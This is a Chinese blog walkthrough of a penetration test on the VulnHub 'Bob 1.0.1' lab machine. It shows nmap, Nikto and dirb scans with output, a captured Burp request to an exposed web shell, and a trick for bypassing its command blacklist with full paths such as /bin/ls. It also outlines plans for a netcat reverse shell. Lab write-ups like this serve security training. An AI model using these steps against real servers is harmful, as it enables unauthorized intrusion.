<h5 id="实验概述-1"><a href="#实验概述-1" class="headerlink" title="实验概述"></a>实验概述</h5><p><strong>目的</strong>：通过对目标主机Bob的渗透测试，理解和掌握基本的网络安全渗透方法。</p>
<p><strong>要求</strong>：</p>
<ul>
<li>完成对目标主机的信息收集</li>
<li>执行渗透测试</li>
<li>获取目标主机控制权</li>
<li>进行后续的深度渗透和数据分析</li>
</ul>
<p><strong>原理</strong>：使用渗透测试工具进行目标主机的漏洞扫描、利用发现的漏洞获取目标主机的控制权，从而理解攻击者可能利用的方法和手段。</p>
<h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><p>靶场</p>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bob-101,226/">Bob: 1.0.1 ~ VulnHub</a> </p>
<p>攻击工具<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&amp;spm=1001.2101.3001.7020">kali</a>虚拟机</p>
<p><img src="https://img-blog.csdnimg.cn/20210920235631222.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p> <img src="https://img-blog.csdnimg.cn/20210920235735486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p> 直接双击打开即可添加到虚拟机。打开后网卡使用NAT模式。</p>
<p><img src="https://img-blog.csdnimg.cn/20210921000718269.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>没有给用户名和密码。（给了就没有攻击的必要了 hhh）</p>
<h4 id="二、实训流程及分析-1"><a href="#二、实训流程及分析-1" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h4><h5 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h5><ul>
<li><strong>操作</strong>：使用Nmap进行目标主机发现和端口扫描。</li>
<li><strong>目的</strong>：确定目标主机在网络上的存在，并识别开放的端口和服务。</li>
<li><strong>分析</strong>：通过扫描结果，获取目标主机的网络结构和潜在漏洞点。</li>
</ul>
<h5 id="2-网站信息收集"><a href="#2-网站信息收集" class="headerlink" title="2. 网站信息收集"></a>2. 网站信息收集</h5><ul>
<li><strong>操作</strong>：使用Nikto扫描目标网站。</li>
<li><strong>目的</strong>：寻找网站潜在的安全漏洞和敏感信息。</li>
<li><strong>分析</strong>：识别出的漏洞为后续的渗透提供了切入点。</li>
</ul>
<h5 id="3-敏感文件扫描"><a href="#3-敏感文件扫描" class="headerlink" title="3. 敏感文件扫描"></a>3. 敏感文件扫描</h5><ul>
<li><strong>操作</strong>：用Dirb工具进行网页敏感文件扫描。</li>
<li><strong>目的</strong>：探索和识别隐藏的、未经授权的文件和目录。</li>
<li><strong>分析</strong>：发现的敏感文件可能包含有用的信息，为进一步的渗透提供帮助。</li>
</ul>
<h5 id="4-渗透测试"><a href="#4-渗透测试" class="headerlink" title="4. 渗透测试"></a>4. 渗透测试</h5><ul>
<li><strong>操作</strong>：通过Webshell在浏览器中执行命令。</li>
<li><strong>目的</strong>：验证网站的安全性和执行服务器命令的能力。</li>
<li><strong>分析</strong>：执行的命令和反馈结果帮助了解目标系统的内部结构。</li>
</ul>
<h5 id="5-抓包分析"><a href="#5-抓包分析" class="headerlink" title="5. 抓包分析"></a>5. 抓包分析</h5><ul>
<li><strong>操作</strong>：使用Burp Suite捕捉和分析网络流量。</li>
<li><strong>目的</strong>：观察数据传输过程，寻找可能的安全漏洞。</li>
<li><strong>分析</strong>：捕获的数据包揭示了Web应用的通信细节和潜在的安全问题。</li>
</ul>
<h5 id="6-获取Shell控制权"><a href="#6-获取Shell控制权" class="headerlink" title="6. 获取Shell控制权"></a>6. 获取Shell控制权</h5><ul>
<li><strong>操作</strong>：通过Netcat在Kali上监听端口，然后通过Burp Suite发起Shell链接。</li>
<li><strong>目的</strong>：获得目标主机的控制权。</li>
<li><strong>分析</strong>：成功连接到Shell意味着可以远程控制目标主机。</li>
</ul>
<h5 id="7-具体细节"><a href="#7-具体细节" class="headerlink" title="7. 具体细节"></a>7. 具体细节</h5><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104101540865.png" class="" title="image-20240104101540865">
<p><strong>本地信息收集</strong><br>打开kali（集成了大量渗透工具）。<br>使用nmap扫描神器探测本网段存活主机IP，从而确定靶机IP地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.233.135  netmask 255.255.255.0  broadcast 192.168.233.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe98:3ed0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:98:3e:d0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 3959  bytes 3668336 (3.4 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2113  bytes 305050 (297.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 448  bytes 36416 (35.5 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 448  bytes 36416 (35.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105100943.png" class="" title="image-20240104105100943">
<p><code>192.168.233.135</code>kali IP段</p>
<p><code>nmap -sP 192.168.233.0/24</code></p>
<p>查看kali本机IP<br>全面探测端口并将结果导出至<code>nmap.A</code>，全面扫描是因为有些服务会被改端口号，而我们会用到这些端口号，可以看到ssh端口被改。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.233.0/24</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.1</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.2</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:50:56:EA:3E:CA (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.138</span><br><span class="line">Host is up (0.000075s latency).</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.254</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">MAC Address: 00:50:56:F7:F3:DD (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.135</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105348461.png" class="" title="image-20240104105348461">
<p>bob地址</p>
<blockquote>
<p><code>192.168.233.138</code></p>
</blockquote>
<p>nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:58 CST</span><br><span class="line">Nmap scan report for 192.168.233.138</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">| /login.php /dev_shell.php /lat_memo.html </span><br><span class="line">|_/passwords.html</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 84f2f8e5ed3e14f393d41e4c413ba2a9 (RSA)</span><br><span class="line">|   256 5b98c74f846efd566a351683aa9ceaf8 (ECDSA)</span><br><span class="line">|_  256 391656fb4e0f508540d3532241433815 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.30 ms 192.168.233.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds</span><br></pre></td></tr></table></figure>
<p>收集到靶机开启了http和ssh服务及其对应的端口号和版本。<br><img src="https://img-blog.csdnimg.cn/88273c8bd8574284b500608dd88d3c39.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://192.168.233.138/">192.168.233.138</a></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104110302654.png" class="" title="image-20240104110302654">
</blockquote>
<p>经验：多点点多看看，挖掘有用信息，通过浏览网站页面，我们推测Bob J可能是管理员。<br><img src="https://img-blog.csdnimg.cn/ca353b6520cc4aac92ab4efecbff6865.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/a170dfe4c21442a4a16ddbc44c58bb20.png" alt="在这里插入图片描述"><br>使用nikto工具扫描网站后台信息，其中Robots.txt代表反爬虫机制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.233.138</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104111710582.png" class="" title="image-20240104111710582">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nikto -h http://192.168.233.138</span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.233.138</span><br><span class="line">+ Target Hostname:    192.168.233.138</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-01-04 11:16:47 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.25 (Debian)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ /robots.txt: Entry &#x27;/dev_shell.php&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/lat_memo.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/passwords.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ /: Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span><br></pre></td></tr></table></figure>
<p>这是一次使用Nikto工具对名为”Bob”的靶机（IP地址192.168.233.138）进行的网络安全扫描报告。Nikto是一种流行的开源网络安全扫描工具，用于检测网站的潜在漏洞。以下是对扫描结果的解释和分析：</p>
<ol>
<li><p><strong>目标信息</strong>:</p>
<ul>
<li>IP地址: 192.168.233.138</li>
<li>主机名: 192.168.233.138</li>
<li>目标端口: 80（通常用于HTTP服务）</li>
<li>扫描时间: 2024年1月4日 11:16:47（GMT+8）</li>
</ul>
</li>
<li><p><strong>发现的问题和潜在漏洞</strong>:</p>
<ul>
<li><strong>Web服务器版本</strong>: 使用的是Apache/2.4.25 (Debian)，该版本可能已过时，因为最新的Apache版本至少是2.4.54。使用过时的软件版本可能会暴露已知的安全漏洞。</li>
<li><strong>X-Frame-Options未设置</strong>: 此HTTP响应头用于防止点击劫持攻击。未设置此头可能使网站容易受到此类攻击。</li>
<li><strong>缺少X-Content-Type-Options</strong>: 未设置此头可能允许浏览器以与MIME类型不同的方式解释网站内容，可能导致安全问题。</li>
<li><strong>robots.txt文件的内容</strong>: 发现’/dev_shell.php’、’/lat_memo.html’和’/passwords.html’路径在robots.txt文件中，但可以访问。这可能意味着这些路径包含敏感信息或功能，但未被适当保护。</li>
<li><strong>ETags信息泄露</strong>: 服务器配置可能会泄漏inode信息，这可以被用来执行一些特定的攻击，如inode枚举。</li>
<li><strong>允许的HTTP方法</strong>: 发现服务器允许OPTIONS, HEAD, GET, POST方法。额外的方法，特别是OPTIONS，可能会暴露过多的信息给潜在的攻击者。</li>
</ul>
</li>
<li><p><strong>攻击和防御策略</strong>:</p>
<ul>
<li><strong>更新Apache服务器</strong>: 应该更新到最新版本以修复已知的安全漏洞。</li>
<li><strong>配置安全HTTP头</strong>: 应设置X-Frame-Options和X-Content-Type-Options头以增强安全性。</li>
<li><strong>审核robots.txt文件</strong>: 检查robots.txt文件中提到的路径，确保不会公开敏感信息或功能。</li>
<li><strong>限制HTTP方法</strong>: 考虑限制服务器上允许的HTTP方法，只允许必要的方法。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.233.138</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.233.138</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan  4 11:37:11 2024</span><br><span class="line">URL_BASE: http://192.168.233.138/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.233.138/ ----</span><br><span class="line">+ http://192.168.233.138/index.html (CODE:200|SIZE:1425)                                        </span><br><span class="line">+ http://192.168.233.138/robots.txt (CODE:200|SIZE:111)                                         </span><br><span class="line">+ http://192.168.233.138/server-status (CODE:403|SIZE:303)                                      </span><br><span class="line">                                                                                                </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jan  4 11:37:14 2024</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113747750.png" class="" title="image-20240104113747750">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /login.php</span><br><span class="line">Disallow: /dev_shell.php</span><br><span class="line">Disallow: /lat_memo.html</span><br><span class="line">Disallow: /passwords.html</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113947574.png" class="" title="image-20240104113947574">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Really who made this file at least get a hash of your password to display, hackers can&#x27;t do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don&#x27;t make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &gt;:(</span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114138182.png" class="" title="image-20240104114138182">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Memo sent at GMT+10:00 2:37:42 by User: Bob</span><br><span class="line">Hey guys IT here don&#x27;t forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.</span><br><span class="line"></span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114223567.png" class="" title="image-20240104114223567">
<p><code>uname -a</code></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114350590.png" class="" title="image-20240104114350590">
<p>Output:</p>
<p>Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux</p>
<p><strong>BP爬虫</strong>：浏览网页文件，在dev.shell.php中发现有些命令无法使用，因此推测网站存在过滤机制，可能存在白名单。这时候需要用到抓包神器BP：burpsuite，通过抓包搜集有用信息。</p>
<blockquote>
<p>burpsuite</p>
</blockquote>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114724876.png" class="" title="image-20240104114724876">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104134629831.png" class="" title="image-20240104134629831">
<p>首先需要将本地端口号修改为其他服务不用的端口号，然后把网站流量引流到127.0.0.1的8888端口，需要安装插件foxyproxy，同时新增一项BP并开启foxyproxy。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104135039398.png" class="" title="image-20240104135039398">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104140414325.png" class="" title="image-20240104140414325">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104162504862.png" class="" title="image-20240104162504862">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104142417794.png" class="" title="image-20240104142417794">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104164728109.png" class="" title="image-20240104164728109">
<p>在dev.shell.php页面输入ls(之前不让访问的命令)，然后在BP中抓包，将抓到的包send to Repeater模块（重放模块），然后点击intercept is on，即关闭拦截抓包，这样dev.shell.php页面就能接收到先前输入的ls，对方网页也就不会发现异常了。之后点击repeater模块的send按钮，得到response。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=ls</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:26:16 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 675</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    #back&#123;</span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      #shell&#123;</span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don&#x27;t forget to report any bugs we don&#x27;t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    Get out skid lol</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试绕过网站安全机制，猜测网站使用了命令拦截，可以在response中看到黑名单（会拦截的命令）。ls在根下的bin目录中，因此尝试将<code>in_command</code>即输入的命令更改为<code>/bin/ls</code>（通过篡改命令潜入对方网站），此时可以看到web根目录下所有的网页内容，基于此，我们搜集有用内容（<code>php</code>页面包含信息更多，<code>.bak</code>后缀通常为备份文件）。</p>
